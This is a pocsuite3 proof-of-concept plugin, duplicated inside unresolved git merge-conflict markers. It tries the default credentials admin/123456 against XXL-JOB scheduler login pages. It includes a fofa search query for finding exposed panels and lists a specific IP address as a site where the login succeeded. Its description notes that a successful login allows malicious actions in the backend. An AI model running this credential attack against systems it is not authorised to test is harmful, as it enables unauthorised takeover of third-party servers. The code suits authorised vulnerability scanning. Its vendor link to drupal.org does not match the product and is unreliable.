<<<<<<< HEAD
from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class XxlJobPOC(POCBase):
    # fofa语句: title="任务调度中心"
    vulID = "1571"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "TOM"  # PoC作者的大名
    vulDate = "2020-07-09"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-01-13"  # 编写 PoC 的日期
    updateDate = "2022-01-13"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/xuxueli/xxl-job.git"]  # 漏洞地址来源,0day不用写
    name = "XXL_JOB弱口令 PoC"  # PoC 名称
    appPowerLink = "https://www.drupal.org/"  # 漏洞厂商主页地址
    appName = "XXL_JOB"  # 漏洞应用名称
    appVersion = "全版本"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["http://47.99.241.235:8092"]  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = [requests]  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
            xxl_job存在弱口令，使用admin/123456，可以登录到后台进行恶意操作
        """  # 漏洞简要描述
    pocDesc = """直接登录即可"""  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
                   "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                   "Accept-Encoding": "gzip, deflate",
                   "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                   "X-Requested-With": "XMLHttpRequest", "Origin": f"{self.url}", "Connection": "close",
                   "Referer": f"{self.url}/toLogin"}
        data = {"userName": "admin", "password": "123456"}
        result = []
        # 一个异常处理 , 生怕站点关闭了 , 请求不到 , 代码报错不能运行
        try:
            url = self.url.strip() + "/login"  # self.url 就是你指定的-u 参数的值
            response = requests.post(url=url, headers=headers, data=data, allow_redirects=False, verify=False,
                                     timeout=5)
            dit = response.json()
            if dit.get("msg") == None and dit.get("code") == 200:
                result.append(url)
        except Exception as e:
            print(e)
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(XxlJobPOC)
=======
from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class XxlJobPOC(POCBase):
    # fofa语句: title="任务调度中心"
    vulID = "1571"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "TOM"  # PoC作者的大名
    vulDate = "2020-07-09"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-01-13"  # 编写 PoC 的日期
    updateDate = "2022-01-13"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/xuxueli/xxl-job.git"]  # 漏洞地址来源,0day不用写
    name = "XXL_JOB弱口令 PoC"  # PoC 名称
    appPowerLink = "https://www.drupal.org/"  # 漏洞厂商主页地址
    appName = "XXL_JOB"  # 漏洞应用名称
    appVersion = "全版本"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["http://47.99.241.235:8092"]  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = [requests]  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
            xxl_job存在弱口令，使用admin/123456，可以登录到后台进行恶意操作
        """  # 漏洞简要描述
    pocDesc = """直接登录即可"""  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
                   "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                   "Accept-Encoding": "gzip, deflate",
                   "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                   "X-Requested-With": "XMLHttpRequest", "Origin": f"{self.url}", "Connection": "close",
                   "Referer": f"{self.url}/toLogin"}
        data = {"userName": "admin", "password": "123456"}
        result = []
        # 一个异常处理 , 生怕站点关闭了 , 请求不到 , 代码报错不能运行
        try:
            url = self.url.strip() + "/login"  # self.url 就是你指定的-u 参数的值
            response = requests.post(url=url, headers=headers, data=data, allow_redirects=False, verify=False,
                                     timeout=5)
            dit = response.json()
            if dit.get("msg") == None and dit.get("code") == 200:
                result.append(url)
        except Exception as e:
            print(e)
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(XxlJobPOC)
>>>>>>> 079ba1ffb5cb73edffc8aed244d44e390fe6a05b
